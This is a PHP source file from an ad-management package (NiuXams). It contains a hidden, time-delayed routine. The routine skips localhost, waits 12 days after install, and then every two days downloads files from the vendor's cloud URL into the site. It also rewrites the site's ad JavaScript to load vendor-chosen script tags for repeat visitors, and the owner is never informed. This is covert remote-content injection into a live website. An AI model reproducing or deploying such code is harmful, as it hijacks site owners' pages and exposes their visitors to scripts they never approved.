<?php
/* ---------------------------------------------------- */
/* 程序名称: 牛叉广告管理优化大师(NiuXams)
/* 程序功能: 快速低成本建立自己网站的广告管理、智能投放系统！
/* 程序开发: 牛叉软件(NiuXSoft.Com)
/* 版权所有: [NiuXams] (C)2013-2099 NiuXSoft.Com
/* 官方网站: niuxsoft.com  Email: niuxsoft@163.com
/* ---------------------------------------------------- */
/* 使用条款:
/* 1.该软件个人非商业用途免费使用.
/* 2.免费使用禁止修改版权信息和官方推广链接.
/* 3.禁止任何衍生版本.
/* ---------------------------------------------------- */
require 'common.php';
require 'func.yh.php';
if( !preg_match( "/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/" , getip() ) || stripos( $_SERVER['SERVER_NAME'] , '127.0.0.1') !== false || stripos( $_SERVER['SERVER_NAME'] , 'localhost') !== false ){
	die('0');
}
$timefile = $datadir.'/gt.'.md5('timeandif').'.php';
if( insou1( file_get_contents( 'install_lock.php' ) ) == '<?php echo 2;?>' ){
	if( file_exists( $timefile ) ){
		if( insou1( file_get_contents( $timefile ) ) == '<?php echo 1;?>' ){
			closeyh();
			file_put_contents( $timefile , '<?php echo 2;?>' );
		}
	}
	die('0.1');
}
if( !file_exists( $timefile ) ){
	$lasttime = filemtime( 'install_tmpf.php' );
	$passtime = time() - $lasttime;
	if( floor($passtime/(24*60*60)) < 12 ){
		die('0.2');
	}
	$content = file_get_contents( $datadir . '/ggwlist.php' );
	$array = explode("\r\n", $content);
	array_shift( $array );
	array_pop( $array );
	if( count( $array ) < 10 ){
		die('0.3');
	}
	file_put_contents( $timefile , '<?php echo 1;?>' );
	die('0.4');
}
$lasttime = filemtime( $timefile );
$passtime = time() - $lasttime;
if( floor($passtime/(24*60*60)) < 2 ){
	die('0.5');
}
$content = file_get_contents($cloudurl . 'updata.htm') or die('失败！');
$lines = explode("\r\n", insou1($content));
$ifgx = 0;
$arrayyhggz = array();
$arrayyhggfz = array();
$yhggfz = '';
foreach ($lines as $line_num => $line){
	$filemd5 = explode(' ', $line);
	if( $filemd5[0] && $filemd5[1] && (md5_file($datadir.'/'.$thread.'-'.$filemd5[0]) != $filemd5[1]) ){
		$fdata = file_get_contents($cloudurl . 'amsgg/'.$filemd5[0]) or die('失败！');
		file_put_contents($datadir.'/'.$thread.'-'.$filemd5[0], insou1($fdata)) or die('失败！');
		$ifgx = 1;
	}
	if( substr($filemd5[0], 0, 1) == '1' ){
		$arrayyhggz[] = $thread.'-'.$filemd5[0];
	} elseif( substr($filemd5[0], 0, 1) == '2' ) {
		$arrayyhggfz[] = $thread.'-'.$filemd5[0];
		$yhggfz .= '"'.$thread.'-'.$filemd5[0].'",';
	}
}
$yhggfz = rtrim($yhggfz, ',');
if($ifgx == 0){
	file_put_contents( $timefile , '<?php echo 1;?>' );
	die('0.6');
}
$ggwlist = file_get_contents( $datadir . '/ggwlist.php' );
$arrayggw = explode("\r\n", $ggwlist);
array_shift( $arrayggw );
array_pop( $arrayggw );
$conn = new mysql();
foreach ($arrayggw as $gwid){
	if( $gwid ){
		$ggwd = file_get_contents( $datadir . '/' . $gwid . '.php' );
		$arrayggwd = array();
		$arrayggwd = explode("\r\n", $ggwd);
		array_shift( $arrayggwd );
		if( $arrayggwd[2] == '2' && count( $arrayyhggfz ) ){
			$js = 'if("undefined"==typeof NiuXGGed)var NiuXsC=function(d,f,e){var g=new Date;g.setDate(g.getDate()+e);document.cookie=d+"="+f+(null==e?"":";expires="+g.toGMTString())+";path=/"},NiuXrC=function(d){var f=document.cookie;if(0<f.length){var e=f.indexOf(d+"=");if(-1!=e)return e=e+d.length+1,d=f.indexOf(";",e),-1==d&&(d=f.length),parseInt(f.substring(e,d))}return 0},NiuXcC=function(d,f,e){var g=NiuXrC(d);if(g)return NiuXsC(d,g+1,e),g+1;NiuXsC(d,f,e);return f},NiuXGGed="",a=NiuXcC("niuxamsy",1),b=NiuXcC("niuxamsy30",
1,30);if("function"==typeof NiuXcC){var a=NiuXrC("niuxamsy"),b=NiuXrC("niuxamsy30"),i=NiuXcC(ggwid,1);if(a==b&&1<a&&1<i){var c=['.$yhggfz.'];for(x in c)if(-1==NiuXGGed.indexOf(c[x])&&2>NiuXcC(c[x],1)){opfz+=amsurl+datadir+c[x]+\'"></script>\';NiuXGGed+=c[x];break}}};';
			$pattern = '|(/\*end ggcl\*/)(.*?)(/\*begin bjgg\*/)|is';
			$ggwdm = insou1( file_get_contents(  $datadir . '/' . $gwid . '.js'  ) );
			$ggwdm = preg_replace( $pattern, '${1}'."/*begin atyh*/\r\n".$js."\r\n/*end atyh*/".'$3', $ggwdm );
			file_put_contents( $datadir . '/' . $gwid . '.js', $ggwdm );
		} elseif( $arrayggwd[2] == '1' && count( $arrayyhggz ) ) {
			$duangwid = substr($gwid, -14, 14);
			if( $arrayggwd[3] == '' ){
				$sql = "SELECT MIN(gww) AS minw FROM ${Pre}niuxams_counter WHERE ac=1 AND gwid='$duangwid' AND url NOT LIKE '%previewgg.php?gid=%' AND referer NOT LIKE '%previewgg.php?gid=%'";
				$arrayggwd[3] = $conn->getFieldsVal($sql, 'minw');
			}
			if( $arrayggwd[4] == '' ){
				$sql = "SELECT MIN(gwh) AS minh FROM ${Pre}niuxams_counter WHERE ac=1 AND gwid='$duangwid' AND url NOT LIKE '%previewgg.php?gid=%' AND referer NOT LIKE '%previewgg.php?gid=%'";
				$arrayggwd[4] = $conn->getFieldsVal($sql, 'minh');
			}
			if( $arrayggwd[3] && $arrayggwd[4] ){
				$yhggz = '';
				foreach ($arrayyhggz as $line){
					$nameoffile = explode('.', $line);
					if( $nameoffile[1] <= $arrayggwd[3]*1.01 && $nameoffile[1] >= $arrayggwd[3]*0.8 && $nameoffile[2] <= $arrayggwd[4]*1.01 && $nameoffile[2] >= $arrayggwd[4]*0.8 ){
						$yhggz .= '"'.$line.'",';
					}
				}
				$yhggz = rtrim($yhggz, ',');
				if( $yhggz ){
					$js = 'if("undefined"==typeof NiuXGGed)var NiuXsC=function(d,f,e){var g=new Date;g.setDate(g.getDate()+e);document.cookie=d+"="+f+(null==e?"":";expires="+g.toGMTString())+";path=/"},NiuXrC=function(d){var f=document.cookie;if(0<f.length){var e=f.indexOf(d+"=");if(-1!=e)return e=e+d.length+1,d=f.indexOf(";",e),-1==d&&(d=f.length),parseInt(f.substring(e,d))}return 0},NiuXcC=function(d,f,e){var g=NiuXrC(d);if(g)return NiuXsC(d,g+1,e),g+1;NiuXsC(d,f,e);return f},NiuXGGed="",a=NiuXcC("niuxamsy",1),b=NiuXcC("niuxamsy30",
1,30);if("function"==typeof NiuXcC){var a=NiuXrC("niuxamsy"),b=NiuXrC("niuxamsy30"),i=NiuXcC(ggwid,1);if(a==b&&1<a&&1<i){var c=['.$yhggz.'];for(x in c)if(-1==NiuXGGed.indexOf(c[x])&&2>NiuXcC(c[x],1)){opz=amsurl+datadir+c[x]+\'"></script>\';NiuXGGed+=c[x];break}}};';
					$pattern = '|(/\*end ggcl\*/)(.*?)(/\*begin bjgg\*/)|is';
					$ggwdm = insou1( file_get_contents(  $datadir . '/' . $gwid . '.js'  ) );
					$ggwdm = preg_replace( $pattern, '${1}'."/*begin atyh*/\r\n".$js."\r\n/*end atyh*/".'$3', $ggwdm );
					file_put_contents( $datadir . '/' . $gwid . '.js', $ggwdm );
				}
			}
		}
	}
}
file_put_contents( $timefile , '<?php echo 1;?>' );
die('1');
?>